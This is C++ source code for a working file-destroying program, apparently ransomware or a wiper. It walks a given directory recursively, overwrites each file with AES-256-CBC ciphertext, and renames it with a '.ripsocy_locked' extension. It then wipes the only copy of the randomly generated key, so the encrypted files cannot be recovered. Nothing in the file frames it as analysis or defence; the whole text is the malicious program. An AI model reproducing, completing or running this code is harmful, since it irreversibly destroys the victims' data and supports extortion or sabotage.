#include <cstring>
#include <dirent.h>
#include <fcntl.h>
#include <iostream>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <string>
#include <sys/stat.h>
#include <unistd.h>
#include <vector>

// key-destructor
void secure_zero_memory(void *ptr, size_t len) {
  if (ptr != nullptr && len > 0) {
    volatile unsigned char *p = static_cast<volatile unsigned char *>(ptr);
    while (len--) {
      *p++ = 0;
    }
  }
}

// AES-256-CBC
bool encrypt_file(const std::string &filepath, const unsigned char *key,
                  const unsigned char *iv) {
  int fd = open(filepath.c_str(), O_RDWR | O_SYNC);
  if (fd < 0)
    return false;

  struct stat st;
  if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode)) {
    close(fd);
    return false;
  }

  off_t file_size = st.st_size;
  if (file_size <= 0) {
    close(fd);
    std::string new_path = filepath + ".ripsocy_locked";
    rename(filepath.c_str(), new_path.c_str());
    return true;
  }

  // load the whole thing into RAM
  std::vector<unsigned char> plaintext(file_size);
  if (read(fd, plaintext.data(), file_size) != file_size) {
    close(fd);
    return false;
  }

  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  if (!ctx) {
    close(fd);
    return false;
  }

  if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
    EVP_CIPHER_CTX_free(ctx);
    close(fd);
    return false;
  }

  std::vector<unsigned char> ciphertext(file_size + EVP_MAX_BLOCK_LENGTH);
  int len = 0;
  int ciphertext_len = 0;

  if (1 != EVP_EncryptUpdate(ctx, ciphertext.data(), &len, plaintext.data(),
                             file_size)) {
    EVP_CIPHER_CTX_free(ctx);
    close(fd);
    return false;
  }
  ciphertext_len = len;

  if (1 != EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len)) {
    EVP_CIPHER_CTX_free(ctx);
    close(fd);
    return false;
  }
  ciphertext_len += len;

  EVP_CIPHER_CTX_free(ctx);

  // overwrite
  lseek(fd, 0, SEEK_SET);
  ftruncate(fd, ciphertext_len);
  if (write(fd, ciphertext.data(), ciphertext_len) != ciphertext_len) {
    fsync(fd);
    close(fd);
    return false;
  }

  fsync(fd);
  close(fd);

  // change to .locked
  std::string new_path = filepath + ".ripsocy_locked";
  rename(filepath.c_str(), new_path.c_str());

  return true;
}

void recursive_encrypt(const std::string &current_path,
                       const std::string &exclude_dir, const unsigned char *key,
                       const unsigned char *iv) {
  if (current_path == exclude_dir ||
      current_path.rfind(exclude_dir + "/", 0) == 0) {
    return;
  }

  DIR *dir = opendir(current_path.c_str());
  if (!dir)
    return;

  struct dirent *entry;
  while ((entry = readdir(dir)) != nullptr) {
    std::string name = entry->d_name;
    if (name == "." || name == "..")
      continue;

    std::string full_path = current_path + "/" + name;
    struct stat st;
    if (lstat(full_path.c_str(), &st) != 0)
      continue;

    if (S_ISDIR(st.st_mode)) {
      recursive_encrypt(full_path, exclude_dir, key, iv);
    } else if (S_ISREG(st.st_mode)) {
      if (full_path.rfind(".ripsocy_locked") == std::string::npos) {
        encrypt_file(full_path, key, iv);
      }
    }
  }
  closedir(dir);
}

int main(int argc, char *argv[]) {
  if (argc < 3) {
    std::cerr << "Usage: " << argv[0] << " <target_dir> <exclude_dir>\n";
    return 1;
  }

  std::string target = argv[1];
  std::string exclude = argv[2];

  // 1. Generate key
  unsigned char key[32];
  unsigned char iv[16];

  if (RAND_bytes(key, sizeof(key)) != 1 || RAND_bytes(iv, sizeof(iv)) != 1) {
    std::cerr << "[!] Lỗi sinh khóa ngẫu nhiên phần cứng!" << std::endl;
    return 1;
  }

  // 2. encrypt stuffs
  recursive_encrypt(target, exclude, key, iv);

  // 3. zero the key, it knows too much
  secure_zero_memory(key, sizeof(key));
  secure_zero_memory(iv, sizeof(iv));

  return 0;
}
